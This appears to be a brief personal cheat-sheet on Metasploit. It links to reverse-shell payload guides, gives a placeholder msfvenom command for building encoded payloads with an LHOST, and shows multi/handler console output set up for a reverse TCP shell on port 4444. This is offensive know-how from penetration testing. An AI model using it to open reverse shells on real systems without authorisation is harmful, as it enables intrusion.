https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>


msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > grep yes options
   LHOST                   yes       The listen address (an interface may be specified)                                              
   LPORT  4444             yes       The listen port